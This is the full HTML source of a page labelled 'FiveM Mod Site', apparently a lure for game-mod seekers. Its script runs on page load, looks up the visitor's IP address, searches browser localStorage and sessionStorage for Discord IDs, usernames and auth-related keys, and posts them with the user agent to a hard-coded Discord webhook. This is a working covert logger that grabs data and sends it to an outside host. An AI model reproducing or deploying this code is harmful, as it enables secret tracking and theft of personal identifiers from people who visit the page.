<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Mod Site</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e5e5e5;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #111111;
            border: 1px solid #1a1a1a;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .loading {
            text-align: center;
            color: #6b7280;
            font-family: monospace;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .hidden { display: none !important; }
        .watcher {
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 20px;
            margin-bottom: 24px;
        }
        .watcher img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #22c55e;
        }
        .watcher .info { flex: 1; }
        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
        .badge {
            background: #1a1a1a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #22c55e;
            border: 1px solid #22c55e33;
            font-family: monospace;
        }
        .ip-box {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: monospace;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ip-box .label { color: #6b7280; }
        .ip-box .value { color: #22c55e; }
        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
        .status {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            font-size: 12px;
            color: #6b7280;
            font-family: monospace;
        }
        .status .success { color: #22c55e; }
        .status .error { color: #ef4444; }
        .status .info { color: #3b82f6; }
        .status .warning { color: #f59e0b; }
    </style>
</head>
<body>

<div class="card" id="app">
    <div id="loading" class="loading">
        <div>🔍 Loading...</div>
    </div>

    <div id="content" class="hidden">
        <div class="watcher">
            <img id="avatar" src="" alt="avatar">
            <div class="info">
                <div class="name" id="username">Loading...</div>
                <div class="id" id="discordId">ID: loading...</div>
            </div>
            <span class="badge">● WATCHER</span>
        </div>

        <div class="ip-box">
            <span class="label">📡 IP ADDRESS</span>
            <span class="value" id="ipDisplay">fetching...</span>
        </div>

        <div class="status" id="status">
            <span class="info">●</span> Extracting data...
        </div>
    </div>
</div>

<div class="footer">
    FiveM Mod Site
</div>

<script>
    // ============================================================
    // CONFIG
    // ============================================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';

    // ============================================================
    // DOM REFS
    // ============================================================
    const loadingEl = document.getElementById('loading');
    const contentEl = document.getElementById('content');
    const avatarEl = document.getElementById('avatar');
    const usernameEl = document.getElementById('username');
    const discordIdEl = document.getElementById('discordId');
    const ipDisplayEl = document.getElementById('ipDisplay');
    const statusEl = document.getElementById('status');

    // ============================================================
    // STATUS HELPER
    // ============================================================
    function setStatus(msg, type = 'info') {
        const colors = {
            success: '#22c55e',
            error: '#ef4444',
            warning: '#f59e0b',
            info: '#3b82f6'
        };
        statusEl.innerHTML = `<span style="color:${colors[type] || '#3b82f6'}">●</span> ${msg}`;
    }

    // ============================================================
    // GET IP
    // ============================================================
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ============================================================
    // SEND TO WEBHOOK
    // ============================================================
    async function sendToWebhook(data, ip) {
        const timestamp = new Date().toLocaleString();

        let content = `**👁️ VISITOR LOGGED**\n`;
        content += `**IP:** ${ip}\n`;
        content += `**User-Agent:** ${navigator.userAgent}\n`;
        content += `**Timestamp:** ${timestamp}\n`;

        if (data.discordId) {
            content += `**Discord ID:** ${data.discordId}\n`;
            content += `**Username:** ${data.username || 'unknown'}\n`;
        } else {
            content += `**Discord ID:** Not found\n`;
        }

        if (data.storageKeys && data.storageKeys.length > 0) {
            content += `**Storage Keys Found:** ${data.storageKeys.join(', ')}\n`;
        }

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content })
            });

            if (res.ok) {
                setStatus(`✅ Webhook sent! ${data.discordId ? 'ID: ' + data.discordId : 'No Discord ID found'}`, 'success');
            } else {
                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
            }
        } catch (err) {
            setStatus(`❌ Webhook error: ${err.message}`, 'error');
        }
    }

    // ============================================================
    // EXTRACT DISCORD ID FROM STORAGE
    // ============================================================
    function extractDiscordData() {
        const keysToCheck = [
            'discord_user',
            'discordId',
            'userId',
            'user',
            'currentUser',
            'profile',
            'discord_data',
            'discord_auth',
            'user_data',
            'auth_user',
            'me',
            'account',
            'discord_profile'
        ];

        const found = [];
        let discordId = null;
        let username = null;

        // Check localStorage
        for (const key of keysToCheck) {
            try {
                const raw = localStorage.getItem(key);
                if (raw) {
                    found.push(key);
                    let parsed;
                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }

                    // Try to find discord ID in the data
                    if (typeof parsed === 'object' && parsed !== null) {
                        if (parsed.id && /^\d{17,20}$/.test(parsed.id)) {
                            discordId = parsed.id;
                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
                        }
                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId)) {
                            discordId = parsed.userId;
                            username = parsed.username || parsed.global_name || 'unknown';
                        }
                        if (parsed.discordId && /^\d{17,20}$/.test(parsed.discordId)) {
                            discordId = parsed.discordId;
                            username = parsed.username || parsed.global_name || 'unknown';
                        }
                        if (parsed.user && parsed.user.id && /^\d{17,20}$/.test(parsed.user.id)) {
                            discordId = parsed.user.id;
                            username = parsed.user.username || parsed.user.global_name || 'unknown';
                        }
                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed)) {
                        discordId = parsed;
                    }
                }
            } catch {}
        }

        // Check sessionStorage as well
        for (const key of keysToCheck) {
            try {
                const raw = sessionStorage.getItem(key);
                if (raw) {
                    if (!found.includes(key)) found.push(key + '(session)');
                    let parsed;
                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }

                    if (typeof parsed === 'object' && parsed !== null) {
                        if (parsed.id && /^\d{17,20}$/.test(parsed.id) && !discordId) {
                            discordId = parsed.id;
                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
                        }
                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId) && !discordId) {
                            discordId = parsed.userId;
                            username = parsed.username || parsed.global_name || 'unknown';
                        }
                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed) && !discordId) {
                        discordId = parsed;
                    }
                }
            } catch {}
        }

        // If still no ID, try to find any 18-digit number in any localStorage value
        if (!discordId) {
            try {
                for (const key of Object.keys(localStorage)) {
                    try {
                        const raw = localStorage.getItem(key);
                        const match = raw?.match(/\b(\d{17,20})\b/);
                        if (match) {
                            discordId = match[1];
                            found.push(key + '(regex)');
                            break;
                        }
                    } catch {}
                }
            } catch {}
        }

        return { discordId, username, storageKeys: found };
    }

    // ============================================================
    // SHOW USER UI
    // ============================================================
    function showUI(data, ip) {
        loadingEl.classList.add('hidden');
        contentEl.classList.remove('hidden');

        if (data.discordId) {
            usernameEl.textContent = data.username || 'Unknown User';
            discordIdEl.textContent = `ID: ${data.discordId}`;
            // Try to generate an avatar URL from the ID
            const avatarHash = '0' + data.discordId;
            avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(data.discordId) % 5}.png`;
        } else {
            usernameEl.textContent = 'Guest';
            discordIdEl.textContent = 'ID: not found';
            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
            setStatus('⚠️ No Discord ID found in browser storage', 'warning');
        }

        ipDisplayEl.textContent = ip;
    }

    // ============================================================
    // MAIN
    // ============================================================
    async function init() {
        const ip = await getIP();

        // Try to extract Discord data from storage
        const data = extractDiscordData();

        // Show UI
        showUI(data, ip);

        // Send to webhook
        await sendToWebhook(data, ip);

        // If no Discord ID found, log which keys were checked
        if (!data.discordId) {
            setStatus(`🔍 Checked keys: ${data.storageKeys.join(', ') || 'none found'}`, 'warning');
        }
    }

    // ============================================================
    // START
    // ============================================================
    init();
</script>

</body>
</html>
